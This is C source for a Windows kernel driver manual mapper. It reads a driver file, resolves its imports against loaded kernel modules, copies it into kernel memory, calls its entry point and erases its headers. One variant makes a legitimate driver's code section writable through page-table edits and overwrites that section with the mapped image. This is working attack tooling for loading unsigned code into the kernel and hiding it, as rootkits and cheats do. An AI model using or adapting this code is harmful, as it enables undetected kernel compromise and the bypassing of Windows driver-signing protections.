#include "dmap.h"
#include "rt.h"
#include "mixx.h"
#include "pmem.h"

#include <stdint.h>
#include <stdio.h>

#define ptr_add(ptr, offset) ((char*)(ptr) + offset)
#define ptr_sub(ptr, offset) ((char*)(ptr) - offset)
#define ptr_cast(type, ptr, offset) ((type*)ptr_add(ptr, (offset)))
#define ptr_cast0(type, ptr) \
  ptr_cast(type, ptr, 0)

static void* virt_alloc(SIZE_T size) {
  return VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

static void virt_free(void* ptr) {
  VirtualFree(ptr, 0, MEM_RELEASE);
}

static IMAGE_NT_HEADERS64* get_nt_hdrs64(void* img_base, WORD magic) {
  IMAGE_NT_HEADERS64* nt_hdrs;
  IMAGE_DOS_HEADER* dos_hdr = img_base;
  if (dos_hdr->e_magic != magic) {
    return NULL;
  }
  nt_hdrs = ptr_cast(IMAGE_NT_HEADERS64,
    img_base, dos_hdr->e_lfanew);
  if (nt_hdrs->Signature != IMAGE_NT_SIGNATURE ||
    nt_hdrs->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
    return NULL;
  }
  return nt_hdrs;
}

static void* get_kern_mod_base(const char* mod_name) {
  void* mod_base = NULL;
  RTL_PROCESS_MODULES* modules;
  ULONG len = 0, i;
  NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
  if (status != STATUS_INFO_LENGTH_MISMATCH || !len) {
    return NULL;
  }
  modules = virt_alloc(len);
  if (modules == NULL) {
    return NULL;
  }
  status = NtQuerySystemInformation(SystemModuleInformation, modules, len, &len);
  if (!NT_SUCCESS(status)) {
    virt_free(modules);
    return NULL;
  }
  for (i = 0; i < modules->NumberOfModules; i++) {
    const char* filename = ptr_add(
      modules->Modules[i].FullPathName,
      modules->Modules[i].OffsetToFileName);
    if (!_stricmp(filename, mod_name)) {
      mod_base = modules->Modules[i].ImageBase;
      break;
    }
  }
  virt_free(modules);
  return mod_base;
}

static void* get_kern_proc_addr(void* mod_base, const char* fn_name) {
  void* proc_addr = NULL;
  IMAGE_DOS_HEADER dos_hdr = { 0, };
  IMAGE_NT_HEADERS64 nt_hdrs = { 0, };
  IMAGE_EXPORT_DIRECTORY* export_dir;
  DWORD export_addr, export_size, i;
  void* begin_ptr, * end_ptr;
  uint64_t delta;
  uint32_t* func_table, * name_table;
  uint16_t* ord_table;
  if (!mixx_copy_mem(&dos_hdr, mod_base, sizeof(dos_hdr)) || dos_hdr.e_magic != IMAGE_DOS_SIGNATURE) {
    return NULL;
  }
  if (!mixx_copy_mem(&nt_hdrs, ptr_add(mod_base, dos_hdr.e_lfanew), sizeof(nt_hdrs)) || nt_hdrs.Signature != IMAGE_NT_SIGNATURE) {
    return NULL;
  }
  export_addr = nt_hdrs.OptionalHeader.DataDirectory
    [IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
  export_size = nt_hdrs.OptionalHeader.DataDirectory
    [IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  if (!export_addr || !export_size) {
    return NULL;
  }
  export_dir = virt_alloc(export_size);
  if (export_dir == NULL) {
    return NULL;
  }
  begin_ptr = ptr_add(mod_base, export_addr);
  end_ptr = ptr_add(mod_base, export_addr + export_size);
  if (!mixx_copy_mem(export_dir, begin_ptr, export_size)) {
    virt_free(export_dir);
    return NULL;
  }
  delta = (uint64_t)
    ptr_sub(export_dir, export_addr);
  func_table = (uint32_t*)(export_dir->AddressOfFunctions + delta);
  name_table = (uint32_t*)(export_dir->AddressOfNames + delta);
  ord_table = (uint16_t*)(export_dir->AddressOfNameOrdinals + delta);
  for (i = 0; i < export_dir->NumberOfNames; i++) {
    const char* name = (char*)(name_table[i] + delta);
    if (!_stricmp(name, fn_name)) {
      void* addr = ptr_add(mod_base, func_table[ord_table[i]]);
      if (addr >= begin_ptr && addr <= end_ptr) {
        break;
      }
      proc_addr = addr;
      break;
    }
  }
  virt_free(export_dir);
  return proc_addr;
}

static int resolve_import(const char* mod_name, const char* fn_name, ULONGLONG* fn) {
  void* proc_addr, * mod_base = get_kern_mod_base(mod_name);
  if (mod_base == NULL) {
    return 0;
  }
  proc_addr = get_kern_proc_addr(mod_base, fn_name);
  if (proc_addr == NULL) {
    return 0;
  }
  *fn = (ULONGLONG)proc_addr;
  return 1;
}

static int resolve_imports(IMAGE_NT_HEADERS64* nt_hdrs, void* img_base) {
  IMAGE_IMPORT_DESCRIPTOR* import_desc =
    ptr_cast(IMAGE_IMPORT_DESCRIPTOR, img_base, nt_hdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
  while (import_desc->Name) {
    const char* mod_name = ptr_add(img_base, import_desc->Name);
    IMAGE_THUNK_DATA64* img_first_thunk =
      ptr_cast(IMAGE_THUNK_DATA64, img_base, import_desc->FirstThunk);
    IMAGE_THUNK_DATA64* img_org_first_thunk =
      ptr_cast(IMAGE_THUNK_DATA64, img_base, import_desc->OriginalFirstThunk);
    while (img_org_first_thunk->u1.Function) {
      IMAGE_IMPORT_BY_NAME* import_data =
        ptr_cast(IMAGE_IMPORT_BY_NAME, img_base, img_org_first_thunk->u1.AddressOfData);
      if (!resolve_import(mod_name, import_data->Name, &img_first_thunk->u1.Function)) {
        return 0;
      }
      img_first_thunk++;
      img_org_first_thunk++;
    }
    import_desc++;
  }
  return 1;
}

static void reloc_img(void* img_base, size_t delta) {
  IMAGE_NT_HEADERS64* nt_hdrs = get_nt_hdrs64(img_base, IMAGE_DOS_SIGNATURE);
  (void)(delta);
  // todo
}

static void copy_sections(IMAGE_NT_HEADERS64* nt_hdrs, void* user_ptr, void* img_base) {
  WORD i;
  IMAGE_SECTION_HEADER* img_section_hdr = IMAGE_FIRST_SECTION(nt_hdrs);
  memcpy(user_ptr, img_base,
    nt_hdrs->OptionalHeader.SizeOfHeaders);
  for (i = 0; i < nt_hdrs->FileHeader.NumberOfSections; i++) {
    void* virt_section = ptr_add(user_ptr, img_section_hdr[i].VirtualAddress);
    void* raw_section = ptr_add(img_base, img_section_hdr[i].PointerToRawData);
    memcpy(virt_section, raw_section,
      img_section_hdr[i].SizeOfRawData);
  }
}

static int rebuild_pe64(IMAGE_NT_HEADERS64* nt_hdrs, void* user_ptr, void* kern_ptr, void* img_base, size_t img_size) {
  copy_sections(nt_hdrs, user_ptr, img_base);
  reloc_img(user_ptr, (size_t)
    ptr_sub(kern_ptr, nt_hdrs->OptionalHeader.ImageBase));
  return resolve_imports(nt_hdrs, user_ptr);
}

static int dmap(void* img_base, void* kern_ptr, int* status, unsigned short magic) {
  int ret;
  DWORD img_size;
  void* user_ptr;
  IMAGE_NT_HEADERS64* nt_hdrs = get_nt_hdrs64(img_base, magic);
  if (nt_hdrs == NULL) {
    return 0;
  }
  img_size = nt_hdrs->OptionalHeader.SizeOfImage;
  user_ptr = virt_alloc(img_size);
  if (user_ptr == NULL) {
    return 0;
  }
  if (!rebuild_pe64(nt_hdrs, user_ptr, kern_ptr, img_base, img_size)) {
    virt_free(user_ptr);
    return 0;
  }
  ret = mixx_copy_mem(kern_ptr, user_ptr, img_size);
  virt_free(user_ptr);
  if (!ret) {
    return 0;
  }
  ret = mixx_call_driver_entry(
    ptr_add(kern_ptr, nt_hdrs->OptionalHeader.AddressOfEntryPoint), status);
  mixx_zero_mem(kern_ptr,
    nt_hdrs->OptionalHeader.SizeOfHeaders);
  return ret;
}

#define MAX_FILE_SIZE 0xa00000
#define MIN_FILE_SIZE sizeof(IMAGE_DOS_HEADER)

static void* read_file_by_handle(HANDLE handle, size_t* size) {
  LARGE_INTEGER large_int;
  DWORD offset = 0, remain, bytes_read;
  void* buf;
  if (!GetFileSizeEx(handle, &large_int) ||
    large_int.QuadPart > MAX_FILE_SIZE ||
    large_int.QuadPart < MIN_FILE_SIZE) {
    return NULL;
  }
  remain = large_int.LowPart, buf = malloc(remain);
  if (buf == NULL) {
    return NULL;
  }
  while (remain) {
    if (!ReadFile(handle, ptr_add(buf, offset), remain, &bytes_read, NULL)) {
      free(buf);
      return NULL;
    }
    offset += bytes_read;
    remain -= bytes_read;
  }
  if (size != NULL) {
    *size = offset;
  }
  return buf;
}

static void* read_file(const char* filename, size_t* size) {
  void* buf;
  HANDLE handle = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL,
    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (handle == INVALID_HANDLE_VALUE) {
    return NULL;
  }
  buf = read_file_by_handle(handle, size);
  CloseHandle(handle);
  return buf;
}

static LONGLONG get_file_size(const char* filename) {
  LARGE_INTEGER file_size;
  BOOL ret;
  HANDLE handle = CreateFileA(filename, GENERIC_READ,
    FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (handle == INVALID_HANDLE_VALUE) {
    return 0;
  }
  ret = GetFileSizeEx(handle, &file_size);
  CloseHandle(handle);
  if (!ret) {
    return 0;
  }
  return file_size.QuadPart;
}

int dmap_from_file(const char* filename, void* kern_ptr, int* status, unsigned short magic) {
  int ret;
  void* buf;
  if (kern_ptr == NULL) {
    kern_ptr = mixx_get_text_section();
    if (kern_ptr == NULL) {
      return 0;
    }
  }
  buf = read_file(filename, NULL);
  if (buf == NULL) {
    return 0;
  }
  ret = dmap(buf, kern_ptr, status, magic);
  free(buf);
  return ret;
}

static const char* get_name(const char* filename) {
  const char* name = strrchr(filename, '\\');
  if (name == NULL) {
    return NULL;
  }
  return name + 1;
}

#define align(x, size) \
    (((x) + (size) - 1) / (size) * (size))

static DWORD find_exec_section(const char* filename, DWORD file_size, DWORD* section_size) {
  DWORD ret = 0;
  WORD i = 0, num_of_sections;
  PIMAGE_NT_HEADERS64 nt_hdrs;
  PIMAGE_SECTION_HEADER section_hdr;
  void* buf = read_file(filename, NULL);
  if (buf == NULL) {
    return 0;
  }
  nt_hdrs = get_nt_hdrs64(buf, IMAGE_DOS_SIGNATURE);
  if (nt_hdrs == NULL ||
    nt_hdrs->OptionalHeader.SizeOfCode < file_size) {
    free(buf);
    return 0;
  }
  file_size =
    align(file_size, 16);
  section_hdr = (PIMAGE_SECTION_HEADER)
    (nt_hdrs + 1);
  for (num_of_sections = nt_hdrs->FileHeader.NumberOfSections;
    i < num_of_sections; i++, section_hdr++) {
    if (section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
      if (section_hdr->Misc.VirtualSize >= file_size) {
        ret = section_hdr->VirtualAddress;
        break;
      }
    }
  }
  *section_size =
    nt_hdrs->OptionalHeader.SizeOfImage;
  free(buf);
  return ret;
}

static int region_cb(struct pmem* mem, PVOID vaddr, ULONG_PTR paddr, SIZE_T size, PVOID param) {
  int* ret = param;
  struct page_table_info info;
  pmem_query_page_table_info(mem, &info, vaddr);
  if (info.pml4e == NULL || info.pdpte == NULL || info.pde == NULL || info.pte == NULL) {
    *ret = 0;
  }
  else {
    if (info.pte->present) {
      info.pte->rw = 1;
    }
  }
  return 0;
}

static int make_page_writable(void* addr, unsigned int size) {
  int ret = 1;
  struct pmem mem;
  if (!pmem_init(&mem)) {
    return 0;
  }
  if (!pmem_attach_to_pid(&mem, 4)) {
    return 0;
  }
  pmem_iter_phys_region(&mem, addr, size, region_cb, &ret);
  pmem_detach(&mem);
  return ret;
}

#define MIN_SIZE 0x100000

int dmap_from_file_ex(const char* filename, const char* proxy_filename, int* status, unsigned short magic) {
  const char* proxy_name;
  void* proxy_mod_base, * kern_ptr;
  DWORD exec_section, section_size;
  LONGLONG file_size = get_file_size(filename);
  if (!file_size || file_size > MIN_SIZE) {
    return 0;
  }
  proxy_name = get_name(proxy_filename);
  if (proxy_name == NULL) {
    return 0;
  }
  proxy_mod_base = get_kern_mod_base(proxy_name);
  if (proxy_mod_base == NULL) {
    return 0;
  }
  exec_section = find_exec_section(proxy_filename,
    (DWORD)file_size, &section_size);
  if (!exec_section) {
    return 0;
  }
  kern_ptr =
    ptr_add(proxy_mod_base, exec_section);
  if (!make_page_writable(kern_ptr, section_size)) {
    return 0;
  }
  return dmap_from_file(filename, kern_ptr, status, magic);
}
